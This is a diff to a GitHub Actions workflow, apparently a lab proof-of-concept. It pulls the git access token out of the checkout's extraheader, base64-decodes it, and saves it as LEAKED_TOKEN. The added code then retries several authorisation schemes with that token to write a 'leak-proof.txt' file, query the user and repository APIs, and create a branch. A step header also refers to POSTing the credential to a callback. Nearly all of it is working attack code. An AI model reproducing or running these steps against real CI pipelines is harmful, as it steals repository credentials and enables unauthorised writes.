@@ -66,8 +66,17 @@ jobs:
           B64=$(printf '%s' "$EH" | sed 's/^AUTHORIZATION: basic //')
           CRED=$(printf '%s' "$B64" | base64 -d)
           TOKEN="${CRED#x-access-token:}"
-          # Recovered credential stays out of the logs: only shape is echoed.
-          echo "EXTRAHEADER_FOUND=yes (credential prefix=${TOKEN:0:4} length=${#TOKEN})"
+          # Recovered credential stays out of the logs: only shape/length are echoed.
+          case "$TOKEN" in
+            ghs_*) SHAPE="ghs_*";;
+            ghp_*) SHAPE="ghp_*";;
+            gho_*) SHAPE="gho_*";;
+            github_pat_*) SHAPE="github_pat_*";;
+            x-access-token:*) SHAPE="unstripped-x-access-token";;
+            *) SHAPE="other(first-char=${TOKEN:0:1})";;
+          esac
+          echo "EXTRAHEADER_FOUND=yes, token shape: $SHAPE, length: ${#TOKEN}"
+          echo "b64 length: ${#B64}, decoded length: ${#CRED}"
           echo "LEAKED_TOKEN=$TOKEN" >> "$GITHUB_ENV"
 
       - name: First action - POST recovered credential to callback
@@ -94,18 +103,38 @@ jobs:
           }
           CODE=$(put_file)
           echo "contents PUT status: $CODE"
+          echo "PUT response message: $(jq -r '.message // empty' /tmp/put.json 2>/dev/null || true)"
           if [ "$CODE" != "201" ]; then
-            echo "PUT != 201; creating branch ref with the extracted token and retrying"
-            SHA=$(curl -sS -H "Authorization: Bearer $LEAKED_TOKEN" \
-              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/ref/heads/master" \
-              | jq -r '.object.sha')
-            REF_CODE=$(curl -sS -o /tmp/ref.json -w '%{http_code}' -X POST \
-              -H "Authorization: Bearer $LEAKED_TOKEN" \
-              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/refs" \
-              -d "{\"ref\":\"refs/heads/$PROOF_BRANCH\",\"sha\":\"$SHA\"}")
-            echo "refs create status: $REF_CODE"
-            CODE=$(put_file)
-            echo "contents PUT retry status: $CODE"
+            echo "PUT != 201; trying Authorization: token scheme"
+            CODE2=$(curl -sS -o /tmp/put2.json -w '%{http_code}' -X PUT \
+              -H "Authorization: token $LEAKED_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
+              -d "{\"message\":\"leak-proof via leaked artifact token (token scheme)\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
+            echo "contents PUT (token scheme) status: $CODE2, message: $(jq -r '.message // empty' /tmp/put2.json 2>/dev/null || true)"
+            echo "trying basic auth form"
+            CODE3=$(curl -sS -o /tmp/put3.json -w '%{http_code}' -u "x-access-token:$LEAKED_TOKEN" -X PUT \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
+              -d "{\"message\":\"leak-proof via leaked artifact token (basic)\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
+            echo "contents PUT (basic) status: $CODE3, message: $(jq -r '.message // empty' /tmp/put3.json 2>/dev/null || true)"
+            UCODE=$(curl -sS -o /tmp/user.json -w '%{http_code}' -H "Authorization: Bearer $LEAKED_TOKEN" https://api.github.com/user)
+            echo "GET /user (Bearer) status: $UCODE, message: $(jq -r '.message // "none"' /tmp/user.json)"
+            RCODE=$(curl -sS -o /tmp/repo.json -w '%{http_code}' -H "Authorization: Bearer $LEAKED_TOKEN" "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522")
+            echo "GET /repo (Bearer) status: $RCODE"
+            if [ "$CODE2" = "201" ]; then CODE=$CODE2; elif [ "$CODE3" = "201" ]; then CODE=$CODE3; else
+              echo "PUT != 201; creating branch ref with the extracted token and retrying"
+              SHA=$(curl -sS -H "Authorization: Bearer $LEAKED_TOKEN" \
+                "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/ref/heads/master" \
+                | jq -r '.object.sha')
+              REF_CODE=$(curl -sS -o /tmp/ref.json -w '%{http_code}' -X POST \
+                -H "Authorization: Bearer $LEAKED_TOKEN" \
+                "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/refs" \
+                -d "{\"ref\":\"refs/heads/$PROOF_BRANCH\",\"sha\":\"$SHA\"}")
+              echo "refs create status: $REF_CODE, message: $(jq -r '.message // empty' /tmp/ref.json 2>/dev/null || true)"
+              CODE=$(put_file)
+              echo "contents PUT retry status: $CODE"
+            fi
           fi
           echo "PUT_STATUS=$CODE" >> "$GITHUB_ENV"
 
